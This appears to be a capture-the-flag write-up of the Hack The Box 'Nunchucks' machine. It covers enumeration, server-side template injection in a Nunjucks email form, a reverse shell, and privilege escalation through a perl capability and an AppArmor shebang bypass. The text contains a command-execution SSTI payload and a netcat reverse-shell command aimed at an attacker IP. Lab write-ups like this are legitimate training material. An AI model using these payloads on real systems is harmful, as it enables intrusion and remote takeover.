# Nunchucks

**Date**: 04/07/2022

**Difficulty**: Easy

**CTF**: [https://app.hackthebox.com/machines/Nunchucks](https://app.hackthebox.com/machines/Nunchucks)

---

Let’s test the connection with the target machine:

<figure><img src="../../.gitbook/assets/nunchucks0.png" alt=""><figcaption></figcaption></figure>

We have received back the ping, so we have connection. Let’s scan the TCP ports of the target machine using nmap:

<figure><img src="../../.gitbook/assets/nunchucks1.png" alt=""><figcaption></figcaption></figure>

3 open ports: 22 (ssh), 80 (http), 443 (https). Let’s scan them further:

<figure><img src="../../.gitbook/assets/nunchucks2.png" alt=""><figcaption></figcaption></figure>

Apparently the website hosted in the port 80, redirects us to [https://nunchucks.htb/](https://nunchucks.htb/). Also, the ssl certificate and the DNS of the https service also reveals the domain name, so it seems like is applying virtual hosting. Let’s add this domain to the /etc/hosts file:

<figure><img src="../../.gitbook/assets/nunchucks3.png" alt=""><figcaption></figcaption></figure>

Let’s inspect the website using whatweb:

<figure><img src="../../.gitbook/assets/nunchucks4.png" alt=""><figcaption></figcaption></figure>

At least now it resolves. Let’s see how it looks using the web browser:

<figure><img src="../../.gitbook/assets/nunchucks5.png" alt=""><figcaption></figcaption></figure>

Seems like a normal page… Let’s click on the upper left Nunchucks image:

<figure><img src="../../.gitbook/assets/nunchucks6.png" alt=""><figcaption></figcaption></figure>

It opens a index.html page that says that the page doesnt exist. Weird.

<figure><img src="../../.gitbook/assets/nunchucks7.png" alt=""><figcaption></figcaption></figure>

We also have a signup form

<figure><img src="../../.gitbook/assets/nunchucks8.png" alt=""><figcaption></figcaption></figure>

and a login form

<figure><img src="../../.gitbook/assets/nunchucks9.png" alt=""><figcaption></figcaption></figure>

Also, the website is setting a cookie called `_csrf` nice name, this kind of cookies are usually used to prevent CSRF attacks.

Let’s start testing the login form agains sqli:

<figure><img src="../../.gitbook/assets/nunchucks10.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/nunchucks11.png" alt=""><figcaption></figcaption></figure>

Uh… user logins are disabled. Let’s try then to sign up:

<figure><img src="../../.gitbook/assets/nunchucks12.png" alt=""><figcaption></figcaption></figure>

Ooookay… so no login and no signup.

Anyway the form is sending the information. Maybe if we have a valid cookie the system will allow us to log in?

<figure><img src="../../.gitbook/assets/nunchucks13.png" alt=""><figcaption></figcaption></figure>

Let’s take a look to the website again:

<figure><img src="../../.gitbook/assets/nunchucks14.png" alt=""><figcaption></figcaption></figure>

There is a support email in the footer of the website. Let’s note it, maybe it will be useful…

Let’s enumerate the directories of the website:

<figure><img src="../../.gitbook/assets/nunchucks15.png" alt=""><figcaption></figcaption></figure>

Maybe we can look for subdomains:

<figure><img src="../../.gitbook/assets/nunchucks16.png" alt=""><figcaption></figcaption></figure>

wfuzz discovered the `store` subdomain, let’s add it to the /etc/hosts file

<figure><img src="../../.gitbook/assets/nunchucks17.png" alt=""><figcaption></figcaption></figure>

And now let’s visit the subdomain:

<figure><img src="../../.gitbook/assets/nunchucks18.png" alt=""><figcaption></figcaption></figure>

There is nothing else here but a form… Let’s use it:

<figure><img src="../../.gitbook/assets/nunchucks19.png" alt=""><figcaption></figcaption></figure>

Mmmm… it includes the mail that I entered in the webpage. Maybe this page is vulnerable to SSTI? Let’s check it:

<figure><img src="../../.gitbook/assets/nunchucks20.png" alt=""><figcaption></figcaption></figure>

Yep, it is. 

<figure><img src="../../.gitbook/assets/nunchucks21.png" alt=""><figcaption></figcaption></figure>

NUNJUCKS sound pretty similar to Nunchucks, let’s start with this:

`{{range.constructor("return global.process.mainModule.require('child_process').execSync('COMMAND_WE_WANT_TO_EXECUTE')")()}}`

but adding backslashes to escape double quotes and using burpsuite to bypass the email format check:

<figure><img src="../../.gitbook/assets/nunchucks22.png" alt=""><figcaption></figcaption></figure>

Let’s try to see the passwd file:

<figure><img src="../../.gitbook/assets/nunchucks23.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/nunchucks24.png" alt=""><figcaption></figcaption></figure>

Let’s look inside the home folder of david, we may find ssh credentials or something useful:

<figure><img src="../../.gitbook/assets/nunchucks25.png" alt=""><figcaption></figcaption></figure>

Ok, there is no .ssh folder, but we can see the user.txt flag:

<figure><img src="../../.gitbook/assets/nunchucks26.png" alt=""><figcaption></figcaption></figure>

Ok, we managed to get the user flag, but we have to access to the target machine. Let’s find a way to establish a reverse shell… 

<figure><img src="../../.gitbook/assets/nunchucks27.png" alt=""><figcaption></figcaption></figure>

ok, the target machine has netcat installed, let’s try a simple `nc -e /bin/sh 10.10.10.10 1234`

<figure><img src="../../.gitbook/assets/nunchucks28.png" alt=""><figcaption></figcaption></figure>

Bad Gateway… something doesn’t work… what if we encode the command in base64 and send it this way?

<figure><img src="../../.gitbook/assets/nunchucks29.png" alt=""><figcaption></figcaption></figure>

It worked, nice. Let’s stabilize the tty:

<figure><img src="../../.gitbook/assets/nunchucks30.png" alt=""><figcaption></figcaption></figure>

Ok, now let’s find a way to escalate privileges. Let’s start looking for SUID files:

<figure><img src="../../.gitbook/assets/nunchucks31.png" alt=""><figcaption></figcaption></figure>

Nothing useful. Let’s see if there is any binary with capabilities:

<figure><img src="../../.gitbook/assets/nunchucks32.png" alt=""><figcaption></figcaption></figure>

Uh, perl has a `setsuid` capability… And it appears in GTFO Bins as something we can take advance of to escalate to root:

<figure><img src="../../.gitbook/assets/nunchucks33.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/nunchucks34.png" alt=""><figcaption></figcaption></figure>

I tried it. I tried a lot of things but nothing happened:

<figure><img src="../../.gitbook/assets/nunchucks35.png" alt=""><figcaption></figcaption></figure>

Apparently I had to discover this:

<figure><img src="../../.gitbook/assets/nunchucks36.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/nunchucks37.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/nunchucks38.png" alt=""><figcaption></figcaption></figure>

What is inside /opt/backup.pl?

<figure><img src="../../.gitbook/assets/nunchucks39.png" alt=""><figcaption></figcaption></figure>

Is a perl script. Let’s execute it:

<figure><img src="../../.gitbook/assets/nunchucks40.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/nunchucks41.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/nunchucks42.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/nunchucks43.png" alt=""><figcaption></figcaption></figure>

Nothing useful there. Let’s investigate a little bit more about AppArmor:

Looking for bugs and vulns I found this one: 

[Bug #1911431 "Unable to prevent execution of shebang lines" : Bugs : AppArmor](https://bugs.launchpad.net/apparmor/+bug/1911431)

<figure><img src="../../.gitbook/assets/nunchucks44.png" alt=""><figcaption></figcaption></figure>

it says that if we create a script with the shebang of the restricted application, it will ignore the restrictions. Let’s try it!

<figure><img src="../../.gitbook/assets/nunchucks45.png" alt=""><figcaption></figcaption></figure>

And now, let’s execute it:

<figure><img src="../../.gitbook/assets/nunchucks46.png" alt=""><figcaption></figcaption></figure>

And that’s how we became root. Pretty interesting.